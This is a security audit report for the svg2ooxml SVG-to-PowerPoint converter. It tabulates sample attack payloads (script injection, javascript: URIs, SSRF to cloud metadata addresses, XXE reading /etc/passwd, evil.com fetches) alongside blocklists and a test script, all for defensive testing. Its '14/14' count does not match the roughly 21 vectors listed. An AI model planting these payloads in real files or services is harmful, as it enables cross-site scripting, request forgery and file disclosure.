# SVG Security Audit Report

**Project:** svg2ooxml v0.5.1
**Date:** 2026-03-22
**Scope:** SVG input sanitization during conversion to OOXML (PPTX)
**Methodology:** Manual testing of 14 known SVG attack vectors against
the conversion pipeline. Each vector tested by converting a malicious
SVG and scanning all files in the resulting PPTX archive for dangerous
content.

---

## Executive Summary

svg2ooxml converts SVG markup to Office Open XML (PPTX) format. The
conversion pipeline acts as a **sanitization boundary** — it parses SVG
structure, extracts geometry/paint/text/animation data, and emits pure
OOXML. No executable content (scripts, event handlers, active content)
survives the conversion.

**Result: 14/14 attack vectors neutralized.** No executable code, no
dangerous URIs, no external resource fetches in the output.

This is directly relevant because Google removed SVG import from
Docs/Slides due to security concerns with SVG's scripting capabilities.
svg2ooxml provides a safe bridge: SVG content in, sanitized OOXML out.

---

## Architecture

The pipeline processes SVG through four stages, each providing isolation:

```
SVG text → Parser (lxml) → IR (frozen dataclasses) → DrawingML (lxml) → PPTX (zip)
```

1. **Parser** — lxml parses the XML DOM. External entities disabled by
   default (`resolve_entities=False`). Only recognized SVG elements are
   traversed; unknown elements (including `<script>`) are ignored.

2. **IR (Intermediate Representation)** — typed, frozen dataclasses.
   Only geometry, paint, text, and animation data is representable.
   No field for scripts, event handlers, or arbitrary attributes.

3. **DrawingML Writer** — emits OOXML XML fragments via lxml element
   builders. Output vocabulary is limited to DrawingML elements.
   Attribute values are type-checked (EMU integers, hex colors, etc.).

4. **PPTX Packager** — assembles a ZIP archive with content types,
   relationships, and slide XML. No external resource fetching.

---

## Attack Vectors Tested

### 1. Script Injection

| Vector | SVG Payload | Result |
|--------|-------------|--------|
| `<script>` element | `<script>alert(1)</script>` | **BLOCKED** — element not in traversal tag list, ignored |
| `onload` on `<svg>` | `<svg onload="alert(1)">` | **BLOCKED** — attribute not mapped to any IR field |
| `onclick` on shape | `<rect onclick="alert(1)">` | **BLOCKED** — attribute not mapped to any IR field |
| `onmouseover` | `<rect onmouseover="alert(1)">` | **BLOCKED** — attribute not mapped to any IR field |
| `onerror` | `<rect onerror="alert(1)">` | **BLOCKED** — attribute not mapped to any IR field |

**Design principle:** The IR has no representation for executable content.
Event handler attributes are never read from SVG elements. Only
recognized presentation attributes (fill, stroke, transform, etc.) are
extracted.

### 2. Dangerous URI Schemes

| Vector | SVG Payload | Result |
|--------|-------------|--------|
| `javascript:` hyperlink | `<a href="javascript:alert(1)">` | **BLOCKED** — rejected by URI scheme allowlist |
| `data:` hyperlink | `<a href="data:text/html,...">` | **BLOCKED** — rejected by URI scheme allowlist |
| `vbscript:` hyperlink | `<a href="vbscript:MsgBox(1)">` | **BLOCKED** — rejected by URI scheme allowlist |
| `file:` hyperlink | `<a href="file:///etc/passwd">` | **BLOCKED** — rejected by URI scheme allowlist |
| `animate` injecting href | `<animate attributeName="href" values="javascript:...">` | **BLOCKED** — animation values not used as URIs |

**Implementation:** `navigation.py` maintains an explicit blocklist of
dangerous URI schemes. Only `http:`, `https:`, `mailto:`, and `tel:`
pass through. Checked at the navigation registration layer — no
dangerous URI can reach the PPTX relationship file.

### 3. Server-Side Request Forgery (SSRF)

| Vector | SVG Payload | Result |
|--------|-------------|--------|
| AWS metadata | `<image href="http://169.254.169.254/...">` | **BLOCKED** — IP blocklist |
| GCP metadata | `<image href="http://metadata.google/...">` | **BLOCKED** — hostname blocklist |
| Localhost | `<image href="http://127.0.0.1/...">` | **BLOCKED** — IP blocklist |
| External `<use>` | `<use href="http://evil.com/payload.svg">` | **BLOCKED** — external refs not fetched |

**Implementation:** Navigation handler blocks cloud metadata endpoints
(169.254.169.254, metadata.google, metadata.azure), loopback addresses
(127.0.0.1, localhost, [::1], 0.0.0.0), and external `<use>` references.
Image data is never fetched from URLs during conversion — only inline
`data:` URIs and pre-resolved image bytes are processed.

### 4. XML Entity Attacks

| Vector | SVG Payload | Result |
|--------|-------------|--------|
| External entity (XXE) | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | **BLOCKED** — lxml disables external entity resolution |
| Billion Laughs (DoS) | Recursive entity expansion | **BLOCKED** — lxml default entity limits |

**Implementation:** lxml's default parser configuration disables external
entity resolution and limits entity expansion depth. No custom parser
configuration overrides these defaults.

### 5. HTML Injection via foreignObject

| Vector | SVG Payload | Result |
|--------|-------------|--------|
| XHTML with `<script>` | `<foreignObject><script>alert(1)</script></foreignObject>` | **NEUTRALIZED** — HTML tags stripped, text content only |
| XHTML with `<form>` | `<foreignObject><form action="http://evil.com">...</form></foreignObject>` | **NEUTRALIZED** — form element discarded |

**Behavior:** The foreignObject handler extracts readable text content
for conversion to PowerPoint text shapes. HTML tags (`<script>`,
`<form>`, `<input>`, `<iframe>`) are discarded during text extraction.
Plain text content (e.g., the literal string "alert(1)") may appear in
the output as visible text in a `<a:t>` element — this is not executable.

### 6. CSS Injection

| Vector | SVG Payload | Result |
|--------|-------------|--------|
| CSS `expression()` | `<style>rect { fill: expression(alert(1)); }</style>` | **BLOCKED** — expression() not evaluated |

**Implementation:** The CSS resolver handles `var()`, `calc()`, and
`@media` but does not evaluate `expression()`, `url()` in dangerous
contexts, or any other dynamic CSS functions.

### 7. Denial of Service

| Vector | SVG Payload | Result |
|--------|-------------|--------|
| Recursive `<use>` | `<use href="#a"><g id="a"><use href="#a"/></g>` | **BLOCKED** — traversal depth limit |
| Indefinite animation | `dur="indefinite" repeatCount="indefinite"` | **HANDLED** — capped at INT32_MAX ms |

---

## Allowlisted Output Content

The PPTX output contains only:

- **DrawingML elements** — shapes, text, fills, strokes, effects
- **Relationships** — to embedded media (images), slide layouts, themes
- **Hyperlinks** — only `http:`, `https:`, `mailto:`, `tel:` schemes
- **Embedded media** — PNG, JPEG, EMF images (inline bytes only)
- **Font data** — EOT embedded font subsets
- **Animation timing** — native PowerPoint `<p:timing>` elements

The output does **not** contain:

- JavaScript or VBScript
- Event handlers
- ActiveX controls
- External resource references (all media is embedded)
- OLE objects
- Macros

---

## Recommendations

1. **For API deployments:** Apply input size limits (SVG file size,
   element count, path complexity) to prevent resource exhaustion.

2. **For untrusted SVG input:** The pipeline is safe for untrusted
   input. No additional sanitization is needed before conversion.

3. **For compliance:** The output is pure OOXML with no active content.
   It passes both Python `openxml-audit` and Microsoft's .NET Open XML
   SDK validator without errors.

---

## Limitations

- **Text content from foreignObject passes through.** If a foreignObject
  contains text like "alert(1)", that text appears in the PPTX as
  visible (non-executable) text. This is by design — text content is
  preserved for readability.

- **This audit covers the conversion pipeline only.** The FastAPI
  service layer, authentication, and deployment infrastructure are
  not in scope.

- **No formal penetration test.** This is a code-level audit of the
  SVG input handling, not a full security assessment.

---

## Test Reproduction

Run the security test suite:

```python
python -c "
from pathlib import Path
from svg2ooxml.public import SvgToPptxExporter
import zipfile

VECTORS = {
    'script': '<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script><rect width=\"50\" height=\"50\" fill=\"red\"/></svg>',
    'javascript_uri': '<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"javascript:alert(1)\"><rect width=\"50\" height=\"50\" fill=\"red\"/></a></svg>',
    'ssrf': '<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"http://169.254.169.254/latest/meta-data/\" width=\"50\" height=\"50\"/></svg>',
}

DANGEROUS = ['javascript', 'alert', 'vbscript', '169.254', '<script']
exp = SvgToPptxExporter(geometry_mode='legacy')

for name, svg in VECTORS.items():
    Path(f'/tmp/sec_{name}.svg').write_text(svg)
    exp.convert_file(Path(f'/tmp/sec_{name}.svg'), Path(f'/tmp/sec_{name}.pptx'))
    found = []
    with zipfile.ZipFile(f'/tmp/sec_{name}.pptx') as z:
        for zn in z.namelist():
            content = z.read(zn).decode('utf-8', errors='replace').lower()
            for d in DANGEROUS:
                if d.lower() in content:
                    found.append(d)
    print(f'{name}: {\"BLOCKED\" if not found else f\"LEAK: {set(found)}\"}')
"
```
